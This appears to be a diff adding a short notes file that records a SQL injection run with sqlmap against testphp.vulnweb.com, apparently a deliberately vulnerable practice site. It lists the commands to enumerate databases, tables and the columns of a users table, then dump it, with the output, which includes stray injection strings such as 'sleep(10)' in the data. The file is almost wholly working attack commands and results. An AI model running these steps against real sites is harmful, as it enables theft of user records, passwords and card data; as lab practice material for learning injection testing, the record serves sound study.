@@ -1,0 +1,46 @@
+DBS:
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent --dbs
+[*] acuart
+[*] information_schema
+	
+
+TABLES:
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent -D acuart --tables
+
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+
+COLUMNS:
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent -D acuart -T users --columns
+
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| name    | varchar(100) |
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+
+DUMP:
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent -D acuart -T users --dump
+
++-----------+----------------------------------+------+------------------------------------------+-------+-------+-----------------+------------------+          
+| cc        | cart                             | pass | email                                    | phone | uname | name            | address          |          
++-----------+----------------------------------+------+------------------------------------------+-------+-------+-----------------+------------------+          
+| wawe55435 | dc56a3149ccc7045706d054bf8f49954 | test | -ZocE)ELT(7114=1934,1934) AND (5849=5849 | er    | test  | qw / sleep(10)  | 894 N. Beach St. |
++-----------+----------------------------------+------+------------------------------------------+-------+-------+-----------------+------------------+
